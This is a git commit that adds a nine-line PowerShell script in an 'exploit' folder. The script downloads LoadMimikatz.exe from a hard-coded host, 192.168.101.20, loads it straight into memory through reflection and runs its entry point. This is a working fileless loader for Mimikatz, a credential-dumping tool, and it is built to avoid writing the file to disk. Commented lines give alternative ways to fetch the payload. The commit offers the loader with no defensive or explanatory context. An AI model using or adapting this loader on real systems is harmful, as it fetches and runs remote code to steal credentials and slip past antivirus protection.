02cefffeafc0669bcdfa227e0f8f5c8a5ca5dc8e
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2022-06-27 22:33:16 -0700

    Add files via upload

---
+++ exploit/PowershellAssembly.ps1
@@ -0,0 +1,9 @@
+﻿#$assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\PELoaderMimikatz\LoadMimikatz.exe'
+#$assemblyByte = (Invoke-WebRequest "http://192.168.101.20:1996/LoadMimikatz.exe").Content
+#$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyFile)
+
+$assemblyByte = (New-Object Net.WebClient).DownloadData("http://192.168.101.20:1996/LoadMimikatz.exe")
+$assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
+$assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
+$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
+$assembly.EntryPoint.Invoke($null, $null)
